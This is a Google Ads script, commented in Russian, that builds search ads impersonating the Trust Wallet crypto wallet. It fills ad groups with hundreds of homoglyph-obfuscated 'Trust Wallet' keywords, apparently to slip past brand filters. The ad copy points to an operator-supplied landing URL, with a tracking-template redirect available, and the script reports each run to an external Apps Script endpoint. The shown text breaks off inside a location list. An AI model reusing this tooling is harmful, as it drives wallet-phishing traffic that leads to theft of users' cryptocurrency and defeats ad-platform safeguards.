function main() {
    //
    //
    const inputParameters = {
        url__: "",
        trackingUrl__: "",
        countriesStr: "",
        samaraId: "",
    };

    //
    //

    //
    // new zealand
    if (!inputParameters.url__ || !inputParameters.trackingUrl__) {
        Logger.log(
            "ERROR. CHECK INPUT PARAMETERS: const inputParameters = {  url__: '', trackingUrl__: '', countriesStr: '' };"
        );
        return;
    }

    //
    //

    var bgt = Math.random() * 700 + 4290; // бюджет | максимум 9.9, минимум 2.9
    bgt = Math.round(bgt);
    bgt = bgt / 100;
    // bgt = 2;
    var key__ = getKeyword();
    var opts = {
        cOpts: {
            name: "Search-1", // <- Меняй название кампании, если предыдущий запуск был неуспешным (по любой причине) и запускаешь повторно
            budget: bgt,
            lang: "", //it;es;pt <- несколько языков в таком формате
            type: "Search",
            strategy: "Maximize clicks", //    "Manual CPC", "CPC (enhanced)",  "Target CPA", "Maximize clicks", "Maximize conversions"
            // network: "Search", //  если нужны оба, то null без кавычек
            status: "Enabled", // "Paused" or "Enabled"
        },
        gOpts: {
            name: "AdGroup - 2",
            cpc: "6.90",
            keywords: [
                // ниже вставляй свои ключевые слова. Строго соблюдай синтаксис (кавычки и косые линии) для вразового соответствия
                { word: key__, cpc: 6.9 },
                { word: '"' + key__ + '"', cpc: 6.9 },
                { word: "[" + key__ + "]", cpc: 6.9 },
            ],
        },
        aOpts: {
            h1: ["Trust Wallet", "Trust Wallet Connect", "Trust Wallet Start Now", "Trust Wallet Web Connect"],
            h2: ["Get Information", "Sign Up Online Secure", "Connect and Start Now"],
            h3: ["Fast safe Web Access", "Information online", "Connect With Web"],
            d1: [
                "Trust Wallet Safe & Secure Get Information. Fast & safe Web Access",
                "Trust Wallet Safe & Secure Get Information",
                "Wallet near you. Fast Access & secure. Manage your wallet assets.",
            ],
            d2: [
                "Connect With Web Access - Secure Access",
                "Work safely in the internet. Make all actions private and confident.",
                "Connect With Web Access - Secure Access. Available worldwide.",
            ],
            url: inputParameters.url__,
        },
        lOpt: {
            // локации на включение и исключение выбирай из списка ниже
            inc: [],
            exc: [],
        },
        proximities: [],
        tracking: {
            enabled: true,
            template:
                "https://clickserve.dartsearch.net/link/click?{_dssagcrid}&{_dssftfiid}&ds_e_adid={creative}&ds_e_matchtype={ifsearch:search}{ifcontent:content}&ds_url_v=2&ds_dest_url={_uurl}/?url={lpurl}",
            uurl: inputParameters.trackingUrl__,
        },
        type: "crypto",
        geo: inputParameters.countriesStr,
        samaraId: inputParameters.samaraId,
        // targetedCountries: targetedCountries,
    };
    _updateAd(opts);

    //showAllPlacementExclusions(opts.cOpts.name);
}
function setupReport(opts) {
    var report = {
        account: AdsApp.currentAccount().getCustomerId(),
        type: opts.type,
        geo: opts.geo,
        url: opts.aOpts.url,
        samaraId: opts.samaraId,
    };
    if (opts.gOpts.keywords.length) {
        report.keyword = opts.gOpts.keywords[0].word;
    }
    var resp1 = UrlFetchApp.fetch(
        "https://script.google.com/macros/s/AKfycbxKa5JWljVilYqg28lEMp4vMakiAsKrZ06Bg8d42Ir2qvTv-TokPypG_xw9zrS-6UCMew/exec",
        {
            method: "POST",
            payload: JSON.stringify(report),
            headers: {
                "Content-Type": "application/json",
            },
        }
    );
}
function _updateAd(opts) {
    // var campResult = _createSearchCampaigns(opts.cOpts);
    // if (!campResult.ok) {
    //     Logger.log("Problem! createCampaigns");
    //     return 0;
    // }
    // Utilities.sleep(7000);
    var adGroupResult = _addGroup(opts.cOpts.name, opts.gOpts);
    if (!adGroupResult.ok) {
        Logger.log("Problem! addGroup");
        return 0;
    }

    Utilities.sleep(7000);
    var adReustlt = _addExpandedTextAd(opts.cOpts.name, opts.gOpts.name, opts.aOpts);
    if (!adReustlt.ok) {
        Logger.log("Problem! addExpandedTextAd");
        return 0;
    }

    // Utilities.sleep(2000);
    // _addLocations(opts.cOpts.name, opts.lOpt.inc);

    // Utilities.sleep(2000);
    // _remLocations(opts.cOpts.name, opts.lOpt.exc);

    // targetCampaignByProximity(opts);
    // insertTemplate(opts);
    setupReport(opts);
    Logger.log("All was done! ! !");
}

function _addLocations(campaignName, arrayLoc) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + campaignName + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        // Target France (location id = 2250) and set a bid modifier of +50%. See
        // https://developers.google.com/adwords/api/docs/appendix/geotargeting
        // for details.
        for (var i = 0; i < arrayLoc.length; i++) {
            var loc = arrayLoc[i];
            campaign.addLocation(loc, 1);
        }
    }
}

function _remLocations(campaignName, arrayLoc) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + campaignName + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        // Target France (location id = 2250) and set a bid modifier of +50%. See
        // https://developers.google.com/adwords/api/docs/appendix/geotargeting
        // for details.
        for (var i = 0; i < arrayLoc.length; i++) {
            var loc = arrayLoc[i];
            campaign.excludeLocation(loc, 1);
        }
    }
}

function _createSearchCampaigns(cOpts) {
    try {
        var columns = [
            "Campaign",
            "Budget",
            /*"Networks",*/ "Language",
            "Bid Strategy type",
            "Campaign type",
            "Campaign Status",
        ];

        var upload = AdWordsApp.bulkUploads().newCsvUpload(columns, {
            moneyInMicros: false,
        });

        upload.append({
            Campaign: cOpts.name || "Search-1.",
            Budget: cOpts.budget,
            "Budget type": "Daily",
            //Networks: cOpts.network,
            Language: cOpts.lang,
            "Campaign type": cOpts.type,
            "Ad rotation": "Optimize for clicks",
            "Bid Strategy type": cOpts.strategy,
            "Campaign Status": cOpts.status,
        });
        // Use upload.apply() to make changes without previewing.
        upload.apply();
        return { ok: true };
    } catch (e) {
        Logger.log(e);
        return { ok: false };
    }
    return { ok: false };
}

function _addGroup(campaignName, gOpts) {
    //Logger.log(campaignName);
    //Logger.log(gOpts);
    try {
        var campaignIterator = AdsApp.campaigns()
            .get();
        while (campaignIterator.hasNext()) {
            var campaign = campaignIterator.next();
            var adGroupOperation = campaign.newAdGroupBuilder().withName(gOpts.name).withCpc(gOpts.cpc).build();
            var adGroup = adGroupOperation.getResult();
            if (gOpts.keywords)
                if (gOpts.keywords.length) {
                    for (var i = 0; i < gOpts.keywords.length; i++) {
                        var kw = gOpts.keywords[i];
                        var keywordOperation = adGroup.newKeywordBuilder().withText(kw.word).withCpc(kw.cpc).build();
                        var keyword = keywordOperation.getResult();
                    }
                }
            return { adGroup: adGroup, campaign: campaign, ok: true };
        }
    } catch (error) {
        Logger.log(error);
    }

    return { ok: false };
}

function _addExpandedTextAd(campaignName, adGroupName, aOpts) {
    try {
        var adGroupIterator = AdsApp.adGroups()
            .withCondition('Name = "' + adGroupName + '"')
            .get();

        while (adGroupIterator.hasNext()) {
            var adGroup = adGroupIterator.next();
            var adOperation = adGroup
                .newAd()
                .expandedTextAdBuilder()
                .withHeadlinePart1(adjustDescription(shuffleArray(aOpts.h1)))
                .withHeadlinePart2(adjustDescription(shuffleArray(aOpts.h2)))
                .withHeadlinePart3(adjustDescription(shuffleArray(aOpts.h3)))
                .withDescription1(adjustDescription(shuffleArray(aOpts.d1)))
                .withDescription2(adjustDescription(shuffleArray(aOpts.d2)))
                .withFinalUrl(aOpts.url)
                .build();

            var ad = adOperation.getResult();
            return {
                ok: true,
                adGroup: adGroup,
                ad: ad,
            };
        }
    } catch (e) {
        Logger.log(e);
        return { ok: false };
    }
    return { ok: false };
}

function shuffleArray(array) {
    if (!array) return "";
    if (!array.length) return "";
    for (var i = array.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
    return array[0];
}

function getLabels() {
    const labels = {};
    var lbls = AdsApp.labels().get();
    Logger.log(lbls.totalNumEntities());
    while (lbls.hasNext()) {
        var lbl = lbls.next();
        Logger.log(lbl.getName() + " : " + lbl.getDescription());
        labels[lbl.getName()] = lbl.getDescription();
    }
    return labels;
}

function insertTemplate(opts) {
    if (!opts.tracking.enabled) return;
    const options = {
        customParameter_uurl: opts.tracking.uurl, // insert your redirect here
        trackingTemplate: opts.tracking.template,
        insertCustomParameter: true,
        insertTrakingTemplate: true,
        levelCustomParameter: "AD_GROUP", // AD_GROUP | CAMPAIGN
        levelTrakingTemplate: "CAMPAIGN", // AD_GROUP | CAMPAIGN
    };

    var campaignsIterator = AdsApp.campaigns().get();
    var groupsIterator = AdsApp.adGroups().get();

    while (campaignsIterator.hasNext()) {
        var object = campaignsIterator.next();
        if (options.insertCustomParameter && options.levelCustomParameter == "CAMPAIGN") {
            object.urls().setCustomParameters({ uurl: options.customParameter_uurl });
        }
        if (options.insertTrakingTemplate && options.levelTrakingTemplate == "CAMPAIGN") {
            object.urls().setTrackingTemplate(options.trackingTemplate);
        }
    }

    while (groupsIterator.hasNext()) {
        var object = groupsIterator.next();
        if (options.insertCustomParameter && options.levelCustomParameter == "AD_GROUP") {
            object.urls().setCustomParameters({ uurl: options.customParameter_uurl });
        }
        if (options.insertTrakingTemplate && options.levelTrakingTemplate == "AD_GROUP") {
            object.urls().setTrackingTemplate(options.trackingTemplate);
        }
    }
}

function getExList() {
    return [
        2012, 2024, 2031, 2032, 2044, 2048, 2050, 2051, 2052, 2064, 2068, 2070, 2072, 2076, 2084, 2090, 2096, 2100,
        2104, 2108, 2112, 2116, 2120, 2132, 2140, 2144, 2148, 2152, 2156, 2158, 2162, 2166, 2170, 2174, 2178, 2180,
        2184, 2188, 2191, 2196, 2203, 2204, 2212, 2214, 2218, 2222, 2226, 2231, 2232, 2233, 2239, 2242, 2258, 2260,
        2262, 2266, 2268, 2270, 2275, 2288, 2296, 2300, 2308, 2316, 2320, 2324, 2328, 2332, 2334, 2336, 2340, 2348,
        2352, 2356, 2360, 2368, 2376, 2384, 2388, 2392, 2398, 2400, 2404, 2410, 2414, 2417, 2418, 2422, 2426, 2428,
        2430, 2434, 2438, 2440, 2446, 2450, 2454, 2458, 2462, 2466, 2470, 2478, 2480, 2484, 2492, 2496, 2498, 2499,
        2504, 2508, 2512, 2516, 2520, 2524, 2531, 2534, 2535, 2540, 2548, 2558, 2562, 2566, 2570, 2574, 2580, 2581,
        2583, 2584, 2585, 2586, 2591, 2598, 2600, 2604, 2608, 2612, 2616, 2620, 2624, 2626, 2630, 2634, 2642, 2643,
        2646, 2654, 2659, 2662, 2666, 2670, 2674, 2678, 2682, 2686, 2688, 2690, 2694, 2702, 2703, 2704, 2705, 2706,
        2710, 2716, 2740, 2748, 2762, 2764, 2768, 2772, 2776, 2780, 2784, 2788, 2792, 2795, 2798, 2800, 2804, 2807,
        2818, 2831, 2832, 2834, 2854, 2858, 2860, 2862, 2876, 2882, 2887, 2894,
    ];
}

function getKeyword() {
    const kws = [
        "Truｓt  Wａllｅｔ",
        "Trｕsｔ  Ｗaｌｌｅt",
        "Ｔｒｕsｔ  Ｗaｌleｔ",
        "Tｒｕsｔ  Walｌｅt",
        "Ｔｒuｓｔ  Wａｌlet",
        "Trｕsｔ  Ｗａｌlｅｔ",
        "Trust  Ｗａｌｌｅｔ",
        "Trｕｓｔ  Ｗａlｌｅｔ",
        "Trusｔ  Wａｌｌet",
        "Ｔｒｕst  Wａlｌｅt",
        "Tｒｕｓt  Wａｌleｔ",
        "Ｔｒuｓt  Ｗａｌlet",
        "Ｔrｕsｔ  Wａｌlｅｔ",
        "Tｒuｓt  Ｗaｌleｔ",
        "Tｒuｓｔ  Walleｔ",
        "Ｔrusｔ  Wａllet",
        "Ｔrｕst  Waｌｌｅt",
        "Ｔrust  Ｗalleｔ",
        "Ｔruｓｔ  Ｗallet",
        "Ｔｒuｓt  Wａlｌeｔ",
        "Trｕsｔ  Ｗａｌｌet",
        "Tｒｕｓt  Ｗalｌｅｔ",
        "Ｔrust  Wａｌｌｅｔ",
        "Ｔrust  Ｗaｌleｔ",
        "Ｔrust  Waｌｌｅt",
        "Ｔｒｕｓｔ  Wａlｌｅt",
        "Trｕst  Ｗａｌlｅｔ",
        "Ｔｒuｓt  Wａｌｌeｔ",
        "Ｔｒusｔ  Ｗallｅt",
        "Ｔrｕｓt  Ｗalleｔ",
        "Ｔｒust  Waｌｌeｔ",
        "Ｔｒｕｓｔ  Wａｌｌet",
        "Ｔｒｕｓt  Ｗaｌｌｅt",
        "Ｔｒuｓt  Walｌet",
        "Ｔrｕsｔ  Ｗalleｔ",
        "Ｔｒuｓｔ  Ｗaｌｌet",
        "Tｒｕst  Wａlｌeｔ",
        "Ｔruｓt  Ｗａllet",
        "Tｒuｓｔ  Wａlｌｅｔ",
        "Trｕｓｔ  Waｌｌet",
        "Ｔrｕsｔ  Ｗａｌlｅt",
        "Ｔｒｕｓt  Wａｌlｅt",
        "Trｕｓt  Walleｔ",
        "Trusｔ  Wａlｌｅt",
        "Ｔruｓｔ  Walｌeｔ",
        "Tｒusｔ  Ｗａｌｌet",
        "Tｒust  Ｗａlｌeｔ",
        "Ｔrｕst  Ｗaｌleｔ",
        "Tｒｕｓt  Wａｌlｅｔ",
        "Tｒｕst  Waｌｌｅｔ",
        "Tｒust  Wａllｅｔ",
        "Ｔｒuｓt  Ｗalｌet",
        "Ｔrｕst  Wａｌｌｅｔ",
        "Tｒｕst  Ｗaｌｌｅt",
        "Tｒｕst  Ｗalleｔ",
        "Tｒuｓｔ  Ｗａlｌet",
        "Ｔrusｔ  Ｗａlｌｅｔ",
        "Ｔｒｕｓt  Ｗａｌleｔ",
        "Ｔｒusｔ  Ｗａｌｌｅｔ",
        "Ｔrust  Waｌｌｅｔ",
        "Ｔｒｕst  Wａｌｌeｔ",
        "Tｒｕｓｔ  Ｗａllet",
        "Ｔｒuｓｔ  Wａｌｌｅｔ",
        "Trｕｓｔ  Wａｌlｅｔ",
        "Ｔｒｕsｔ  Ｗａllｅｔ",
        "Ｔｒｕｓt  Wａllｅt",
        "Ｔrｕsｔ  Ｗａｌｌｅt",
        "Ｔruｓｔ  Wａllet",
        "Trusｔ  Ｗallｅt",
        "Trｕst  Wａlｌｅt",
        "Trｕｓt  Waｌｌeｔ",
        "Ｔrｕｓt  Wａｌlet",
        "Ｔrusｔ  Walｌｅｔ",
        "Ｔrｕｓt  Waｌｌet",
        "Ｔｒuｓt  Wａｌｌet",
        "Tｒｕｓt  Ｗaｌlｅｔ",
        "Tｒｕｓｔ  Wａlｌｅｔ",
        "Truｓt  Ｗaｌlet",
        "Ｔｒust  Ｗallｅt",
        "Ｔｒuｓｔ  Ｗaｌｌｅt",
        "Trｕｓt  Ｗａlｌｅt",
        "Trｕst  Wａｌｌeｔ",
        "Trｕst  Waｌlｅｔ",
        "Ｔrusｔ  Wａｌｌeｔ",
        "Ｔｒｕｓt  Walｌｅt",
        "Trusｔ  Wａｌlｅt",
        "Ｔｒuｓｔ  Walｌet",
        "Ｔｒｕｓｔ  Ｗａｌleｔ",
        "Tｒｕsｔ  Waｌｌeｔ",
        "Tｒｕｓt  Ｗａlｌeｔ",
        "Trusｔ  Ｗａlｌｅｔ",
        "Ｔｒｕｓt  Ｗａlleｔ",
        "Tｒｕｓｔ  Ｗaｌｌｅt",
        "Ｔrｕst  Ｗaｌｌeｔ",
        "Ｔrusｔ  Wａｌｌｅt",
        "Tｒust  Ｗａllｅt",
        "Truｓt  Walｌｅｔ",
        "Ｔｒｕｓt  Ｗａｌlｅｔ",
        "Ｔruｓt  Ｗaｌｌｅt",
        "Ｔｒust  Ｗａｌｌｅt",
        "Ｔruｓｔ  Wａlｌｅt",
        "Ｔrｕｓt  Ｗaｌｌeｔ",
        "Ｔｒｕｓt  Ｗallｅｔ",
        "Trｕsｔ  Walleｔ",
        "Trｕｓt  Ｗaｌｌｅｔ",
        "Ｔｒuｓt  Ｗaｌｌet",
        "Ｔｒｕsｔ  Ｗａlｌｅｔ",
        "Ｔruｓｔ  Waｌlｅt",
        "Ｔrust  Waｌｌeｔ",
        "Tｒｕｓt  Ｗａｌｌet",
        "Ｔｒust  Waｌleｔ",
        "Tｒｕｓt  Ｗａllｅt",
        "Tｒｕｓｔ  Ｗallｅt",
        "Ｔｒuｓｔ  Ｗａlｌeｔ",
        "Ｔｒｕst  Waｌｌｅt",
        "Tｒusｔ  Ｗaｌｌｅt",
        "Truｓｔ  Waｌｌｅｔ",
        "Tｒuｓｔ  Ｗalｌet",
        "Ｔｒｕｓt  Ｗａlｌeｔ",
        "Ｔｒｕst  Ｗａllｅｔ",
        "Truｓｔ  Wａllｅｔ",
        "Truｓt  Wallet",
        "Trｕsｔ  Ｗaｌｌet",
        "Tｒｕst  Ｗａｌlｅｔ",
        "Tｒust  Wａｌｌｅt",
        "Tｒｕsｔ  Waｌlｅt",
        "Tｒｕｓt  Ｗallｅt",
        "Ｔｒust  Ｗａｌｌet",
        "Tｒｕｓt  Walｌｅt",
        "Ｔｒｕst  Wａｌlｅt",
        "Trusｔ  Ｗａllet",
        "Trｕｓｔ  Ｗａlleｔ",
        "Truｓt  Wａｌｌｅt",
        "Truｓｔ  Wallｅｔ",
        "Trｕsｔ  Ｗａｌleｔ",
        "Trｕsｔ  Ｗaｌlｅt",
        "Tｒｕsｔ  Ｗalｌｅｔ",
        "Ｔrｕｓｔ  Wａllｅｔ",
        "Ｔｒｕst  Wallet",
        "Truｓｔ  Ｗａｌlｅt",
        "Tｒusｔ  Ｗalleｔ",
        "Trust  Wａlｌet",
        "Tｒuｓt  Walleｔ",
        "Ｔｒuｓｔ  Wａlleｔ",
        "Trusｔ  Ｗａｌlet",
        "Tｒust  Ｗａｌｌeｔ",
        "Truｓt  Ｗallｅt",
        "Tｒust  Waｌleｔ",
        "Ｔruｓｔ  Ｗａlｌｅt",
        "Ｔrｕst  Ｗallet",
        "Trust  Ｗａｌｌet",
        "Tｒusｔ  Wａllｅt",
        "Ｔｒust  Wallet",
        "Trusｔ  Ｗａlleｔ",
        "Ｔruｓｔ  Wａlｌet",
        "Ｔｒｕｓt  Ｗａｌlet",
        "Ｔｒuｓt  Ｗaｌlｅｔ",
        "Tｒｕsｔ  Ｗａｌlｅt",
        "Ｔrust  Ｗａｌｌｅｔ",
        "Tｒuｓｔ  Ｗallet",
        "Tｒｕｓｔ  Waｌｌｅｔ",
        "Ｔｒuｓt  Walｌｅt",
        "Tｒusｔ  Ｗallet",
        "Ｔｒｕsｔ  Ｗallet",
        "Trｕsｔ  Ｗａlｌeｔ",
        "Trｕｓｔ  Ｗａｌｌet",
        "Trｕst  Ｗaｌｌeｔ",
        "Tｒｕｓｔ  Ｗａｌｌｅt",
        "Ｔｒｕｓt  Ｗaｌleｔ",
        "Ｔｒｕｓｔ  Ｗａllet",
        "Truｓt  Ｗaｌｌｅｔ",
        "Truｓｔ  Wａlｌｅｔ",
        "Tｒｕｓｔ  Wａlｌet",
        "Trust  Waｌｌｅｔ",
        "Ｔｒuｓｔ  Ｗａｌlet",
        "Ｔrｕsｔ  Ｗalｌet",
        "Truｓｔ  Waｌｌet",
        "Ｔｒｕst  Wａlleｔ",
        "Ｔｒｕｓt  Ｗａｌlｅt",
        "Tｒuｓｔ  Walｌｅｔ",
        "Ｔrusｔ  Ｗaｌｌｅｔ",
        "Ｔrｕｓｔ  Ｗａllet",
        "Ｔｒuｓt  Ｗallｅt",
        "Ｔｒｕｓｔ  Ｗａｌlｅｔ",
        "Ｔruｓt  Ｗａlleｔ",
        "Ｔruｓｔ  Walｌｅt",
        "Truｓt  Waｌlet",
        "Ｔruｓt  Ｗａｌlｅｔ",
        "Tｒust  Ｗalｌｅｔ",
        "Ｔrusｔ  Wallet",
        "Truｓt  Waｌlｅt",
        "Ｔrｕｓt  Wａｌｌｅt",
        "Ｔｒusｔ  Ｗaｌｌet",
        "Ｔrusｔ  Waｌleｔ",
        "Tｒusｔ  Ｗａｌｌｅt",
        "Trｕst  Ｗaｌleｔ",
        "Ｔrｕst  Ｗａｌlｅｔ",
        "Ｔruｓｔ  Wａｌｌｅｔ",
        "Ｔｒusｔ  Wａｌｌｅt",
        "Ｔｒuｓｔ  Ｗａllｅt",
        "Tｒｕｓｔ  Walｌｅｔ",
        "Ｔｒuｓｔ  Wallet",
        "Ｔｒｕst  Ｗallｅt",
        "Trｕｓt  Ｗａｌlet",
        "Tｒuｓｔ  Ｗaｌｌｅt",
        "Ｔrｕst  Waｌｌet",
        "Trｕst  Wａlｌet",
        "Ｔｒｕsｔ  Wａlｌｅｔ",
        "Ｔrｕst  Wａlｌeｔ",
        "Tｒuｓt  Ｗａlｌｅｔ",
        "Ｔrust  Ｗａlleｔ",
        "Ｔrust  Wａｌlｅｔ",
        "Ｔrｕｓｔ  Ｗａｌlｅｔ",
        "Ｔrｕｓt  Ｗalｌeｔ",
        "Trust  Ｗalｌeｔ",
        "Trust  Wａllｅt",
        "Tｒｕsｔ  Ｗａllｅｔ",
        "Ｔｒuｓｔ  Ｗaｌｌｅｔ",
        "Ｔｒust  Wａlｌeｔ",
        "Tｒuｓｔ  Waｌｌeｔ",
        "Ｔrust  Wａlｌeｔ",
        "Tｒuｓt  Ｗａｌlｅt",
        "Ｔｒｕst  Wａｌleｔ",
        "Trｕsｔ  Wａllｅt",
        "Tｒｕst  Ｗａｌlet",
        "Ｔrust  Ｗａlｌｅｔ",
        "Ｔruｓt  Wａlｌeｔ",
        "Tｒust  Ｗalｌet",
        "Tｒｕst  Ｗaｌleｔ",
        "Ｔrｕsｔ  Ｗaｌｌｅｔ",
        "Ｔｒusｔ  Wａｌlｅt",
        "Ｔrｕst  Ｗallｅｔ",
        "Ｔrusｔ  Wａlｌｅt",
        "Trｕｓｔ  Walｌet",
        "Ｔrust  Waｌlｅt",
        "Ｔrｕst  Walｌeｔ",
        "Tｒｕｓｔ  Wａｌlｅｔ",
        "Ｔrｕst  Wallet",
        "Tｒｕst  Ｗａｌｌｅt",
        "Ｔｒusｔ  Waｌｌeｔ",
        "Ｔｒuｓｔ  Ｗａlｌｅｔ",
        "Ｔｒuｓt  Wａlｌｅｔ",
        "Ｔｒｕｓｔ  Wallet",
        "Ｔｒｕsｔ  Ｗaｌｌet",
        "Tｒuｓt  Wａllｅｔ",
        "Ｔｒusｔ  Ｗａｌleｔ",
        "Ｔｒｕｓt  Ｗａｌｌｅｔ",
        "Truｓｔ  Walｌｅｔ",
        "Trｕst  Wallｅｔ",
        "Tｒｕｓｔ  Wａｌｌet",
        "Tｒuｓt  Waｌｌｅｔ",
        "Trust  Ｗallｅt",
        "Truｓt  Ｗａllet",
        "Trｕｓｔ  Waｌlet",
        "Ｔｒｕsｔ  Waｌleｔ",
        "Ｔｒuｓt  Wａｌlｅt",
        "Tｒｕｓｔ  Ｗaｌlｅt",
        "Truｓt  Ｗaｌlｅｔ",
        "Truｓｔ  Ｗallｅｔ",
        "Ｔrｕst  Wａｌｌet",
        "Ｔｒｕｓt  Wａlｌｅt",
        "Ｔｒｕsｔ  Ｗａlleｔ",
        "Ｔｒust  Ｗａｌlｅｔ",
        "Ｔｒuｓt  Ｗaｌlｅt",
        "Trｕsｔ  Walｌet",
        "Trｕsｔ  Wａｌｌet",
        "Tｒｕｓt  Wａｌｌet",
        "Ｔruｓt  Wａllｅｔ",
        "Ｔｒｕｓt  Wａllｅｔ",
        "Trｕst  Wａlｌeｔ",
        "Ｔruｓｔ  Waｌleｔ",
        "Ｔruｓt  Ｗaｌleｔ",
    ];
    return kws[Math.floor(Math.random() * kws.length)];
}
function targetCampaignByProximity(opts) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + opts.cOpts.name + '"')
        .get();
    while (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        for (var i = 0; i < opts.proximities.length; i++) {
            campaign.addProximity(opts.proximities[i]);
        }
    }
}

function getCountriesExclusion(targetedCountries) {
    var _c = [];
    var allCountriesCodes = getAllCountries();
    // Logger.log(allCountriesCodes.length);
    // var counter = 1;
    for (var i = 0; i < allCountriesCodes.length; i++) {
        var _code = allCountriesCodes[i];
        if (!targetedCountries.array.includes(_code)) {
            _c.push(_code);
        }
    }
    return _c;
}

function getAllCountries() {
    return [
        2012, 2024, 2031, 2032, 2036, 2040, 2044, 2048, 2050, 2051, 2052, 2056, 2064, 2068, 2070, 2072, 2076, 2084,
        2090, 2096, 2100, 2104, 2108, 2112, 2116, 2120, 2124, 2132, 2140, 2144, 2148, 2152, 2156, 2158, 2162, 2166,
        2170, 2174, 2178, 2180, 2184, 2188, 2191, 2196, 2203, 2204, 2208, 2212, 2214, 2218, 2222, 2226, 2231, 2232,
        2233, 2239, 2242, 2246, 2250, 2258, 2260, 2262, 2266, 2268, 2270, 2275, 2276, 2288, 2296, 2300, 2308, 2316,
        2320, 2324, 2328, 2332, 2334, 2336, 2340, 2348, 2352, 2356, 2360, 2368, 2372, 2376, 2380, 2384, 2388, 2392,
        2398, 2400, 2404, 2410, 2414, 2417, 2418, 2422, 2426, 2428, 2430, 2434, 2438, 2440, 2442, 2446, 2450, 2454,
        2458, 2462, 2466, 2470, 2478, 2480, 2484, 2492, 2496, 2498, 2499, 2504, 2508, 2512, 2516, 2520, 2524, 2531,
        2534, 2535, 2540, 2548, 2554, 2558, 2562, 2566, 2570, 2574, 2578, 2580, 2581, 2583, 2584, 2585, 2586, 2591,
        2598, 2600, 2604, 2608, 2612, 2616, 2620, 2624, 2626, 2630, 2634, 2642, 2643, 2646, 2654, 2659, 2662, 2666,
        2670, 2674, 2678, 2682, 2686, 2688, 2690, 2694, 2702, 2703, 2704, 2705, 2706, 2710, 2716, 2724, 2740, 2748,
        2752, 2756, 2762, 2764, 2768, 2772, 2776, 2780, 2784, 2788, 2792, 2795, 2798, 2800, 2804, 2807, 2818, 2826,
        2831, 2832, 2834, 2840, 2854, 2858, 2860, 2862, 2876, 2882, 2887, 2894, 20277, 2528,
    ];
}

function getProximityExclusion() {
    return [
        { latitude: 11.938898, longitude: 24.420256, radius: 500, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 18.539222, longitude: 31.11093, radius: 500, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 20.449822, longitude: -76.281528, radius: 150, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 21.598353, longitude: -79.972934, radius: 150, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 22.087835, longitude: -83.00516, radius: 150, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 23.679232, longitude: -14.027486, radius: 500, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 26.973479, longitude: 60.881687, radius: 500, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 3.849069, longitude: -53.22128, radius: 500, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 33.387874, longitude: 53.416112, radius: 500, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 34.879166, longitude: 66.666354, radius: 500, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 37.102356, longitude: 42.194673, radius: 500, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 40.079088, longitude: 20.14889, radius: 50, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 40.881299, longitude: 20.104945, radius: 50, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 41.94223, longitude: 20.006068, radius: 50, radiusUnits: "MILES", bidModifier: 0.1 },
        { latitude: 8.783627, longitude: 32.330412, radius: 500, radiusUnits: "MILES", bidModifier: 0.1 },
    ];
}

function getProximity(targetedCountries) {
    Logger.log("function getProximity(targetedCountries) {");
    var targetProximities = {
        "united states": [
            //1
            { latitude: 30.44763, longitude: -92.56161, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 31.277516, longitude: -82.38827, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 33.942355, longitude: -105.129969, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 37.648075, longitude: -76.082118, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 38.753139, longitude: -116.731532, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 38.753139, longitude: -93.330653, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 43.67272, longitude: -66.752955, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 43.799727, longitude: -84.133326, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 45.611041, longitude: -100.920436, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 46.586126, longitude: -119.509303, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
        ],
        canada: [
            //2
            { latitude: 46.618429, longitude: -69.248622, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 48.165278, longitude: -86.079677, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 49.094659, longitude: -56.065028, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 50.232377, longitude: -105.942958, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 51.123453, longitude: -123.8287, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 55.077674, longitude: -68.633388, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 55.378422, longitude: -92.407802, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 58.538963, longitude: -108.184169, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 61.480181, longitude: -127.827724, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
        ],
        austria: [
            //3
            { latitude: 47.001908, longitude: 11.169824, radius: 120, radiusUnits: "MILES", bidModifier: 1 },
            { latitude: 47.84184, longitude: 15.102929, radius: 120, radiusUnits: "MILES", bidModifier: 1 },
        ],
        australia: [
            // 4
            { latitude: -16.974868, longitude: 133.144702, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
